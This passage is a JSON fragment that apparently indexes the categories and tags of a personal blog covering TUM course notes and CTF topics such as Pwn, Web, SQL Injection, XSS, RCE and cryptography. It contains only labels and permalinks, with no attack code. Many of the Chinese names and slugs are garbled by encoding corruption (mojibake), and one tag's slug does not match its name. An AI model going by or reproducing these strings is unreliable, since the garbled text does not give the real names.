ç†è®ºä¿¡æ¯å­¦","slug":"TUM-info-è¯¾ç¨‹ç¬”è®°/Theoretische-Informatik-ç†è®ºä¿¡æ¯å­¦","permalink":"https://archer-baiyi.github.io/categories/TUM-info-%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/Theoretische-Informatik-%E7%90%86%E8%AE%BA%E4%BF%A1%E6%81%AF%E5%AD%A6/"},{"name":"Misc","slug":"CTF/Misc","permalink":"https://archer-baiyi.github.io/categories/CTF/Misc/"},{"name":"å¯†ç å­¦ Kryptografie","slug":"TUM-info-è¯¾ç¨‹ç¬”è®°/å¯†ç å­¦-Kryptografie","permalink":"https://archer-baiyi.github.io/categories/TUM-info-%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E5%AF%86%E7%A0%81%E5%AD%A6-Kryptografie/"},{"name":"é‡å­è®¡ç®— Quantum Computing","slug":"TUM-info-è¯¾ç¨‹ç¬”è®°/é‡å­è®¡ç®—-Quantum-Computing","permalink":"https://archer-baiyi.github.io/categories/TUM-info-%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E9%87%8F%E5%AD%90%E8%AE%A1%E7%AE%97-Quantum-Computing/"},{"name":"GBS æ“ä½œç³»ç»Ÿ","slug":"TUM-info-è¯¾ç¨‹ç¬”è®°/GBS-æ“ä½œç³»ç»Ÿ","permalink":"https://archer-baiyi.github.io/categories/TUM-info-%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/GBS-%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"},{"name":"ERA è®¡ç®—æœºä½“ç³»ç»“æ„","slug":"TUM-info-è¯¾ç¨‹ç¬”è®°/ERA-è®¡ç®—æœºä½“ç³»ç»“æ„","permalink":"https://archer-baiyi.github.io/categories/TUM-info-%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/ERA-%E8%AE%A1%E7%AE%97%E6%9C%BA%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84/"},{"name":"Reverse Engineering","slug":"CTF/Reverse-Engineering","permalink":"https://archer-baiyi.github.io/categories/CTF/Reverse-Engineering/"},{"name":"Dantenbank æ•°æ®åº“","slug":"TUM-info-è¯¾ç¨‹ç¬”è®°/Dantenbank-æ•°æ®åº“","permalink":"https://archer-baiyi.github.io/categories/TUM-info-%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/Dantenbank-%E6%95%B0%E6%8D%AE%E5%BA%93/"}],"tags":[{"name":"writeup","slug":"writeup","permalink":"https://archer-baiyi.github.io/tags/writeup/"},{"name":"ç»Ÿè®¡","slug":"ç»Ÿè®¡","permalink":"https://archer-baiyi.github.io/tags/%E7%BB%9F%E8%AE%A1/"},{"name":"Statistics","slug":"Statistics","permalink":"https://archer-baiyi.github.io/tags/Statistics/"},{"name":"Python","slug":"Python","permalink":"https://archer-baiyi.github.io/tags/Python/"},{"name":"Numpy","slug":"Numpy","permalink":"https://archer-baiyi.github.io/tags/Numpy/"},{"name":"æœºå™¨å­¦ä¹ ","slug":"æœºå™¨å­¦ä¹ ","permalink":"https://archer-baiyi.github.io/tags/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/"},{"name":"Machine Learning","slug":"Machine-Learning","permalink":"https://archer-baiyi.github.io/tags/Machine-Learning/"},{"name":"Data Engeneering","slug":"Data-Engeneering","permalink":"https://archer-baiyi.github.io/tags/Data-Engeneering/"},{"name":"bash","slug":"bash","permalink":"https://archer-baiyi.github.io/tags/bash/"},{"name":"GNU Coreutils","slug":"GNU-Coreutils","permalink":"https://archer-baiyi.github.io/tags/GNU-Coreutils/"},{"name":"Shellcode","slug":"Shellcode","permalink":"https://archer-baiyi.github.io/tags/Shellcode/"},{"name":"å¾·è¯­ï¼ŒåŒ»è¯","slug":"å¾·è¯­ï¼ŒåŒ»è¯","permalink":"https://archer-baiyi.github.io/tags/%E5%BE%B7%E8%AF%AD%EF%BC%8C%E5%8C%BB%E8%8D%AF/"},{"name":"Pwn","slug":"Pwn","permalink":"https://archer-baiyi.github.io/tags/Pwn/"},{"name":"ctfshow","slug":"ctfshow","permalink":"https://archer-baiyi.github.io/tags/ctfshow/"},{"name":"Writeup","slug":"Writeup","permalink":"https://archer-baiyi.github.io/tags/Writeup/"},{"name":"Web","slug":"Web","permalink":"https://archer-baiyi.github.io/tags/Web/"},{"name":"Java","slug":"Java","permalink":"https://archer-baiyi.github.io/tags/Java/"},{"name":"æ”»é˜²ä¸–ç•Œ","slug":"æ”»é˜²ä¸–ç•Œ","permalink":"https://archer-baiyi.github.io/tags/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/"},{"name":"HTB","slug":"HTB","permalink":"https://archer-baiyi.github.io/tags/HTB/"},{"name":"Stochastic Analysis","slug":"Stochastic-Analysis","permalink":"https://archer-baiyi.github.io/tags/Stochastic-Analysis/"},{"name":"éšæœºåˆ†æ","slug":"éšæœºåˆ†æ","permalink":"https://archer-baiyi.github.io/tags/%E9%9A%8F%E6%9C%BA%E5%88%86%E6%9E%90/"},{"name":"ctf","slug":"ctf","permalink":"https://archer-baiyi.github.io/tags/ctf/"},{"name":"ctfd","slug":"ctfd","permalink":"https://archer-baiyi.github.io/tags/ctfd/"},{"name":"pè¿›æ•°","slug":"pè¿›æ•°","permalink":"https://archer-baiyi.github.io/tags/p%E8%BF%9B%E6%95%B0/"},{"name":"P-adic Numbers","slug":"P-adic-Numbers","permalink":"https://archer-baiyi.github.io/tags/P-adic-Numbers/"},{"name":"Hensel's Lemma","slug":"Hensel-s-Lemma","permalink":"https://archer-baiyi.github.io/tags/Hensel-s-Lemma/"},{"name":"é›¶çŸ¥è¯†è¯æ˜","slug":"é›¶çŸ¥è¯†è¯æ˜","permalink":"https://archer-baiyi.github.io/tags/%E9%9B%B6%E7%9F%A5%E8%AF%86%E8%AF%81%E6%98%8E/"},{"name":"Zero-knowledge proof","slug":"Zero-knowledge-proof","permalink":"https://archer-baiyi.github.io/tags/Zero-knowledge-proof/"},{"name":"ZKP","slug":"ZKP","permalink":"https://archer-baiyi.github.io/tags/ZKP/"},{"name":"åä¸º","slug":"åä¸º","permalink":"https://archer-baiyi.github.io/tags/%E5%8D%8E%E4%B8%BA/"},{"name":"é¢è¯•","slug":"é¢è¯•","permalink":"https://archer-baiyi.github.io/tags/%E9%9D%A2%E8%AF%95/"},{"name":"ç¼–ç ç†è®º","slug":"ç¼–ç ç†è®º","permalink":"https://archer-baiyi.github.io/tags/%E7%BC%96%E7%A0%81%E7%90%86%E8%AE%BA/"},{"name":"Coding Theory","slug":"Coding-Theory","permalink":"https://archer-baiyi.github.io/tags/Coding-Theory/"},{"name":"Crypto","slug":"Crypto","permalink":"https://archer-baiyi.github.io/tags/Crypto/"},{"name":"Cryptohack","slug":"Cryptohack","permalink":"https://archer-baiyi.github.io/tags/Cryptohack/"},{"name":"Lattices","slug":"Lattices","permalink":"https://archer-baiyi.github.io/tags/Lattices/"},{"name":"LWE(Learning With Error)","slug":"LWE-Learning-With-Error","permalink":"https://archer-baiyi.github.io/tags/LWE-Learning-With-Error/"},{"name":"æ¦‚ç‡è®º","slug":"æ¦‚ç‡è®º","permalink":"https://archer-baiyi.github.io/tags/%E6%A6%82%E7%8E%87%E8%AE%BA/"},{"name":"Probability Theory","slug":"Probability-Theory","permalink":"https://archer-baiyi.github.io/tags/Probability-Theory/"},{"name":"ç®—æ³•ç«èµ›","slug":"ç®—æ³•ç«èµ›","permalink":"https://archer-baiyi.github.io/tags/%E7%AE%97%E6%B3%95%E7%AB%9E%E8%B5%9B/"},{"name":"Codeforce","slug":"Codeforce","permalink":"https://archer-baiyi.github.io/tags/Codeforce/"},{"name":"Zero-knowledge proofs","slug":"Zero-knowledge-proofs","permalink":"https://archer-baiyi.github.io/tags/Zero-knowledge-proofs/"},{"name":"SQL","slug":"SQL","permalink":"https://archer-baiyi.github.io/tags/SQL/"},{"name":"Injection","slug":"Injection","permalink":"https://archer-baiyi.github.io/tags/Injection/"},{"name":"PHP","slug":"PHP","permalink":"https://archer-baiyi.github.io/tags/PHP/"},{"name":"JavaScript","slug":"JavaScript","permalink":"https://archer-baiyi.github.io/tags/JavaScript/"},{"name":"eval()","slug":"eval","permalink":"https://archer-baiyi.github.io/tags/eval/"},{"name":"Ocaml","slug":"Ocaml","permalink":"https://archer-baiyi.github.io/tags/Ocaml/"},{"name":"æ ¼å¼åŒ–å­—ç¬¦ä¸²","slug":"æ ¼å¼åŒ–å­—ç¬¦ä¸²","permalink":"https://archer-baiyi.github.io/tags/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/"},{"name":"Format String","slug":"Format-String","permalink":"https://archer-baiyi.github.io/tags/Format-String/"},{"name":"C","slug":"C","permalink":"https://archer-baiyi.github.io/tags/C/"},{"name":"CTF","slug":"CTF","permalink":"https://archer-baiyi.github.io/tags/CTF/"},{"name":"tool","slug":"tool","permalink":"https://archer-baiyi.github.io/tags/tool/"},{"name":"å“ˆå¸Œ","slug":"å“ˆå¸Œ","permalink":"https://archer-baiyi.github.io/tags/%E5%93%88%E5%B8%8C/"},{"name":"Hash","slug":"Hash","permalink":"https://archer-baiyi.github.io/tags/Hash/"},{"name":"python","slug":"python","permalink":"https://archer-baiyi.github.io/tags/python/"},{"name":"decode","slug":"decode","permalink":"https://archer-baiyi.github.io/tags/decode/"},{"name":"è§£ç ","slug":"è§£ç ","permalink":"https://archer-baiyi.github.io/tags/%E8%A7%A3%E7%A0%81/"},{"name":"base 64","slug":"base-64","permalink":"https://archer-baiyi.github.io/tags/base-64/"},{"name":"Theoretische Informatik","slug":"Theoretische-Informatik","permalink":"https://archer-baiyi.github.io/tags/Theoretische-Informatik/"},{"name":"ç†è®ºä¿¡æ¯å­¦","slug":"ç†è®ºä¿¡æ¯å­¦","permalink":"https://archer-baiyi.github.io/tags/%E7%90%86%E8%AE%BA%E4%BF%A1%E6%81%AF%E5%AD%A6/"},{"name":"Misc","slug":"Misc","permalink":"https://archer-baiyi.github.io/tags/Misc/"},{"name":"esolang","slug":"esolang","permalink":"https://archer-baiyi.github.io/tags/esolang/"},{"name":"Malbolge","slug":"Malbolge","permalink":"https://archer-baiyi.github.io/tags/Malbolge/"},{"name":"å¯†ç å­¦","slug":"å¯†ç å­¦","permalink":"https://archer-baiyi.github.io/tags/%E5%AF%86%E7%A0%81%E5%AD%A6/"},{"name":"Quantum Computing","slug":"Quantum-Computing","permalink":"https://archer-baiyi.github.io/tags/Quantum-Computing/"},{"name":"é‡å­è®¡ç®—","slug":"é‡å­è®¡ç®—","permalink":"https://archer-baiyi.github.io/tags/%E9%87%8F%E5%AD%90%E8%AE%A1%E7%AE%97/"},{"name":"AES","slug":"AES","permalink":"https://archer-baiyi.github.io/tags/AES/"},{"name":"ECB","slug":"ECB","permalink":"https://archer-baiyi.github.io/tags/ECB/"},{"name":"CBC","slug":"CBC","permalink":"https://archer-baiyi.github.io/tags/CBC/"},{"name":"CTR","slug":"CTR","permalink":"https://archer-baiyi.github.io/tags/CTR/"},{"name":"1000","slug":"1000","permalink":"https://archer-baiyi.github.io/tags/1000/"},{"name":"binary","slug":"binary","permalink":"https://archer-baiyi.github.io/tags/binary/"},{"name":"RSA","slug":"RSA","permalink":"https://archer-baiyi.github.io/tags/RSA/"},{"name":"Betriebssysteme","slug":"Betriebssysteme","permalink":"https://archer-baiyi.github.io/tags/Betriebssysteme/"},{"name":"Operating System","slug":"Operating-System","permalink":"https://archer-baiyi.github.io/tags/Operating-System/"},{"name":"è¿›ç¨‹","slug":"è¿›ç¨‹","permalink":"https://archer-baiyi.github.io/tags/%E8%BF%9B%E7%A8%8B/"},{"name":"çº¿ç¨‹","slug":"çº¿ç¨‹","permalink":"https://archer-baiyi.github.io/tags/%E7%BA%BF%E7%A8%8B/"},{"name":"Mutex","slug":"Mutex","permalink":"https://archer-baiyi.github.io/tags/Mutex/"},{"name":"Semaphore","slug":"Semaphore","permalink":"https://archer-baiyi.github.io/tags/Semaphore/"},{"name":"Petri-Netz","slug":"Petri-Netz","permalink":"https://archer-baiyi.github.io/tags/Petri-Netz/"},{"name":"synchron","slug":"synchron","permalink":"https://archer-baiyi.github.io/tags/synchron/"},{"name":"asynchron","slug":"asynchron","permalink":"https://archer-baiyi.github.io/tags/asynchron/"},{"name":"signal","slug":"signal","permalink":"https://archer-baiyi.github.io/tags/signal/"},{"name":"MongoDB","slug":"MongoDB","permalink":"https://archer-baiyi.github.io/tags/MongoDB/"},{"name":"æ³¨å…¥","slug":"æ³¨å…¥","permalink":"https://archer-baiyi.github.io/tags/%E6%B3%A8%E5%85%A5/"},{"name":"switch","slug":"switch","permalink":"https://archer-baiyi.github.io/tags/switch/"},{"name":"XSS","slug":"XSS","permalink":"https://archer-baiyi.github.io/tags/XSS/"},{"name":"html","slug":"html","permalink":"https://archer-baiyi.github.io/tags/html/"},{"name":"æ“ä½œç³»ç»Ÿ","slug":"æ“ä½œç³»ç»Ÿ","permalink":"https://archer-baiyi.github.io/tags/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"},{"name":"å†…å­˜ç®¡ç†","slug":"å†…å­˜ç®¡ç†","permalink":"https://archer-baiyi.github.io/tags/%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/"},{"name":"Paging","slug":"Paging","permalink":"https://archer-baiyi.github.io/tags/Paging/"},{"name":"Page table","slug":"Page-table","permalink":"https://archer-baiyi.github.io/tags/Page-table/"},{"name":"Ersetztungsstrategie","slug":"Ersetztungsstrategie","permalink":"https://archer-baiyi.github.io/tags/Ersetztungsstrategie/"},{"name":"RCE","slug":"RCE","permalink":"https://archer-baiyi.github.io/tags/RCE/"},{"name":"JWT","slug":"JWT","permalink":"https://archer-baiyi.github.io/tags/JWT/"},{"name":"Rechnerarchitektur","slug":"Rechnerarchitektur","permalink":"https://archer-baiyi.github.io/tags/Rechnerarchitektur/"},{"name":"è®¡ç®—æœºä½“ç³»ç»“æ„","slug":"è®¡ç®—æœºä½“ç³»ç»“æ„","permalink":"https://archer-baiyi.github.io/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84/"},{"name":"é€»è¾‘ç”µè·¯å›¾","slug":"é€»è¾‘ç”µè·¯å›¾","permalink":"https://archer-baiyi.github.io/tags/%E9%80%BB%E8%BE%91%E7%94%B5%E8%B7%AF%E5%9B%BE/"},{"name":"é€»è¾‘é—¨","slug":"é€»è¾‘é—¨","permalink":"https://archer-baiyi.github.io/tags/%E9%80%BB%E8%BE%91%E9%97%A8/"},{"name":"wsl","slug":"wsl","permalink":"https://archer-baiyi.github.io/tags/wsl/"},{"name":"sage","slug":"sage","permalink":"https://archer-baiyi.github.io/tags/sage/"},{"name":"vscode","slug":"vscode","permalink":"https://archer-baiyi.github.io/tags/vscode/"},{"name":"kali","slug":"kali","permalink":"https://archer-baiyi.github.io/tags/kali/"},{"name":"Miniforge","slug":"Miniforge","permalink":"https://archer-baiyi.github.io/tags/Miniforge/"},{"name":"Cookie","slug":"Cookie","permalink":"https://archer-baiyi.github.io/tags/Cookie/"},{"name":"Fermat","slug":"Fermat","permalink":"https://archer-baiyi.github.io/tags/Fermat/"},{"name":"PEM","slug":"PEM","permalink":"https://archer-baiyi.github.io/tags/PEM/"},{"name":"CRT","slug":"CRT","permalink":"https://archer-baiyi.github.io/tags/CRT/"},{"name":"Piet","slug":"Piet","permalink":"https://archer-baiyi.github.io/tags/Piet/"},{"name":"SQL Injection","slug":"SQL-Injection","permalink":"https://archer-baiyi.github.io/tags/SQL-Injection/"},{"name":"PHP ä»£ç æ³¨å…¥","slug":"PHP-ä»£ç æ³¨å…¥","permalink":"https://archer-baiyi.github.io/tags/PHP-%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5/"},{"name":"greedy","slug":"greedy","permalink":"https://archer-baiyi.github.io/tags/greedy/"},{"name":"sortings","slug":"sortings","permalink":"https://archer-baiyi.github.io/tags/sortings/"},{"name":"Template Injection","slug":"Template-Injection","permalink":"https://archer-baiyi.github.io/tags/Template-Injection/"},{"name":"æ¨¡æ¿æ³¨å…¥","slug":"æ¨¡æ¿æ³¨å…¥","permalink":"https://archer-baiyi.github.io/tags/%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/"},{"name":"Jinja2","slug":"Jinja2","permalink":"https://archer-baiyi.github.io/tags/Jinja2/"},{"name":"Mako","slug":"Mako","permalink":"https://archer-baiyi.github.io/tags/Mako/"},{"name":"C++","slug":"C","permalink":"https://archer-baiyi.github.io/tags/C/"},{"name":"800","slug":"800","permalink":"https://archer-baiyi.github.io/tags/800/"},{"name":"æ–‡ä»¶ç³»ç»Ÿ","slug":"æ–‡ä»¶ç³»ç»Ÿ","permalink":"https://archer-baiyi.github.io/tags/%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F/"},{"name":"è¾“å…¥/è¾“å‡º","slug":"è¾“å…¥-è¾“å‡º","permalink":"https://archer-baiyi.github.io/tags/%E8%BE%93%E5%85%A5-%E8%BE%93%E5%87%BA/"},{"name":"æ±‡ç¼–è¯­è¨€","slug":"æ±‡ç¼–è¯­è¨€","permalink":"https://archer-baiyi.github.io/tags/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/"},{"name":"RISC-V","slug":"RISC-V","permalink":"https://archer-baiyi.github.io/tags/RISC-V/"},{"name":"Reverse Engineering","slug":"Reverse-Engineering","permalink":"https://archer-baiyi.github.io/tags/Reverse-Engineering/"},{"name":"è™šæ‹ŸåŒ–","slug":"è™šæ‹ŸåŒ–","permalink":"https://archer-baiyi.github.io/tags/%E8%99%9A%E6%8B%9F%E5%8C%96/"},{"name":"è™šæ‹Ÿæœº","slug":"è™šæ‹Ÿæœº","permalink":"https://archer-baiyi.github.io/tags/%E8%99%9A%E6%8B%9F%E6%9C%BA/"},{"name":"container","slug":"container","permalink":"https://archer-baiyi.github.io/tags/container/"},{"name":"Datenbank","slug":"Datenbank","permalink":"https://archer-baiyi.github.io/tags/Datenbank/"},{"name":"Database","slug":"Database","permalink":"https://archer-baiyi.github.io/tags/Database/"},{"name":"æ•°æ®åº“","slug":"æ•°æ®åº“","permalink":"https://archer-baiyi.github.io/tags/%E6%95%B0%E6%8D%AE%E5%BA%93/"},{"name":"socket","slug":"socket","permalink":"https://archer-baiyi.github.io/tags/socket/"},{"name":"remote","slug":"remote","permalink":"https://archer-baiyi.github.io/tags/remote/"}]}